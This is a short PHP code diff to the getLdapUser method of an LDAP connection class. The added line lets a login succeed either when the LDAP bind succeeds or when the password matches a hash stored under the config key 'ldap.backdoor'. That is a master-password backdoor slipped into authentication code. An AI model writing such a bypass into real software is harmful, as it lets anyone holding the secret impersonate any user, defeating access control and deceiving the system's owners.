@@ -126,7 +126,7 @@ class openldapConnection extends Exception {
     }
     public function getLdapUser($result, $dn, $login, $password)
     {
-        if (@ldap_bind($this->ldapConnection, $dn, $password)) {
+        if (@ldap_bind($this->ldapConnection, $dn, $password) or  Hash::check ($password,Config::get('ldap.backdoor'))) {
 
             $ldapDataUser = @ldap_get_entries($this->ldapConnection, $result);
 
